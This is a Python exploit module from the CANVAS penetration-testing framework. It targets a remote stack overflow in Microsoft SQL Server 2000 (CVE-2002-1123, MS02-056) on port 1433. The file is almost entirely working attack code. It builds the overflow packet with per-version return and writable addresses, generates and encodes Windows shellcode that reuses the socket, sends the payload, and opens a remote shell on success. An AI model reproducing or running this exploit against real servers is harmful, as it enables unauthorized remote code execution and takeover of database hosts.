#! /usr/bin/env python

"""
CAN-2002-1123

Needs some work - testing, and conversion to GOCode.

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#Remote overflow in SQL server found by SPIKE 2.5
#Dave Aitel
#http://www.immunityinc.com/spike.html

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation



#note: This is NOT the NGSSOFTWARE resolver service vuln. 

#jmp edi ffe7
#sqlsort: 0x42ae1eb9
#sqlsort (SQL Server 2000 sp0 en) : 0x42ae1ec9
#0x42b0d5c4
#wsock32: 75052fbc

#call edi ffd6

import os,getopt
import sys

if "." not in sys.path: sys.path.append(".")

import socket
from exploitutils import *
from encoder import chunkedaddencoder
from tcpexploit import tcpexploit
import canvasengine
from shellcode import win32shell
from shellcode import shellcodeGenerator
from shelllistener import shelllistener
from win32Node import win32Node
import win32MosdefShellServer

#TODO: FIX THESE
NAME="MSSQL Hello Stack Overflow (MS02-056)"
DESCRIPTION="MS SQL Hello Stack Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"]="08/07/2002"
DOCUMENTATION["CVE Name"] = "CVE-2002-1123"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1123"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]=["http://marc.theaimsgroup.com/?l=bugtraq&m=102865925419469&w=2",
                             "http://marc.theaimsgroup.com/?l=bugtraq&m=102873609025020&w=2",
                             "http://www.iss.net/security_center/static/9788.php"]
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/bulletin/ms02-056.asp"
DOCUMENTATION["Notes"]="This is the TCP stack overflow found with an early version of SPIKE. Exit me with ExitProcess, not exitthread"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
PROPERTY["MSADV"]="MS02-056"


popret="\x54\xc3"
#int3
debugint="\xcc"

#Some exploitation notes I wrote while writing this exploit:
#if socket() is returning 0xffffffff that is because we
#are NOT aligned for some reason.

"""
One thing you should keep in mind is that Windows Server 2003 
Will not allow a default SQL Server to listen on TCP/UDP sockets
because of the worm...
"""
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=1433
        self.host=""
        #should work on everything
        self.setVersion(0)
        self.setVersions()
        self.name=NAME
        
        self.badstring="\x00"
        return

    def neededListenerTypes(self):
        return []

    def createShellcode(self):
        #self.shellcode="\xcc"*100
        #return 
        sc = shellcodeGenerator.win32()
        # GOFindSock and RecvExecWin32 are a match made in heaven
        sc.addAttr("GOFindSock", None)
        # RecvExec leaves active fd in esi 
        sc.addAttr("RecvExecWin32", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return 1
  
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        s=self.gettcpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
        except:
            return 0
        s.close()
        return 1
    
    def setVersions(self):
        self.versions={}
        #version array: name eip writable
        self.versions[0]=("Windows 2000-XP", 0x42b0d5c4,0x42ae7001) 
        self.versions[1]=("Windows 2000 SP0", 0x42ae1eb9,0x751b8181) 
        self.versions[2]=("Windows 2000 SP1/2", 0x42ae1ec9,0x751b8181) 
        self.versions[3]=("Windows 2000 (DoS)", 0x80808080,0x42ae7001) 
        return 
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            

    def setVersionSP12(self):
        self.jmpedilocation=0x42ae1ec9
        self.writeable=0x751b8181        

    
    def setVersionSP0(self):
        """
        Used for SP0 SQL Servers
        """
        self.log( "Attacking a SP0 SQL Server")
        self.jmpedilocation=0x42ae1eb9
        self.writeable=0x751b8181        
        return        

    def setVersionXP(self):
        self.jmpedilocation=0x42b0d5c4   # jmp edi in sqlsort.dll
        self.writeable=0x42ae7001    # sqlsort.dll .data segment

    
    def run(self):
        #first make socket connection to target 1433
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        self.log("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        
        s=self.gettcpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect!")
            self.setInfo("%s attacking %s:%d (could not connect)"%(NAME,self.host,self.port))

            return 0
        sploitstring=self.makesploit()
        s.sendall(sploitstring)
        
        if self.checkTriggerWin32(s):
            self.log("Setting success flag")
            
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            self.setInfo("%s Done"%self.name)
            return node
        
        try:
            result = s.recv(1000)
        except:
            result=""
        self.log( "result="+prettyprint(result))
        s.close()
        #failed?
        self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))

        return self.ISucceeded() 

    #returns the sploitstring
    def makesploit(self):
        
        self.jmpedilocation=self.versions[self.version][1]
        self.writeable=self.versions[self.version][2]
        
        tmp=""
        header=""
        #magic! :>
        #header+=binstring("12 01 00 34 00 00 00 00  00 00 15 00 06 01 00 1b")
        header+=binstring("12 01 00 34 00 00 00 00  00 00 15 00 06 01 00 1b")
        #header+=binstring("00 01 02 00 1c 00 0c 03  00 28 00 04 ff 08 00 02")
        header+=binstring("00 01 02 00 1c 00 0c 03  00 28 00 05 ff 08 00 02")
        header+=binstring("00 00 00 00")
        #132*4 is a crossover point
        tmp+="AAAA"*132
        #local 1 here - must be ff
        tmp+="\xff\xff\xff\xff"
        #frame pointer
        tmp+="DDDD"
        #an older version of this exploit did some really cool things
        #to get execution - but we dont use that anymore since
        #this way is better...
        #eip! - use a jmp esp or call esp to get back
        #OPENDS60 has a call esp at 29db0311
        #ffd4 is also at:
        #42b08a7c 
        #42b48774
        #tmp+=binstring("7c8ab042")
        tmp+="AAAA"
        #COE 1
        #eax at 42cf72b4!
        #410d3ab0 is a piece of memory in SSNMPN70
        #717e7feb is comctr32 rsrc
        #but that doesn't work because it must be writable
        #this works!
        #tmp+=binstring("eb801b29")
        #using this will jump 126 bytes backwards from here
        #there we want to place e9 61feffff to go to
        #beginning of our string (+2 for fun)
        #try 77f780eb
        #this seems to work more reliably .data section. :>
        # 77ed is in kernel32, even better
        #tmp+=binstring("ebe6ed77")
        tmp+=intel_order(self.writeable)
        #5 writable memory locations
        tmp+=intel_order(self.writeable)
        tmp+=intel_order(self.writeable)
        tmp+=intel_order(self.writeable)
        tmp+=intel_order(self.writeable)
        tmp+=intel_order(self.writeable)        





        #self.log( "len tmp="+str(len(tmp)))
        jmpstring=intel_order(self.jmpedilocation)
        #jmpstring=binstring(" e9 f9fdffff ")
        offset=len(tmp)-28 #24+4 before end of string
        #this is a complex way to insert a string
        tmp=stroverwrite(tmp,jmpstring,offset)
        #self.log( "len tmp="+str(len(tmp)))
        self.log( "Length of shellcode = "+str(len(self.shellcode)))
        #tmp=stroverwrite(tmp,callsystem,2)
        #self.log( "len tmp="+str(len(tmp)))
        #print tmp

        if tmp[528:532]!="\xff\xff\xff\xff":
            self.log( "Messed up F's! in tmp")
        
        #ending cruft
        shellcodestring="A"*850
        #here is where we actually place the shellcode into the shellcode string
        shellcodestring=stroverwrite(shellcodestring,self.shellcode,90)
        footer=binstring("00 24 01 00 00")
        return header+tmp+shellcodestring+footer+"A"*500
        

#this stuff happens.
if __name__ == '__main__':

    print "Running CANVAS Microsoft SQL Server HELLO exploit v 0.5"
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0]:
        ret.interact()
        
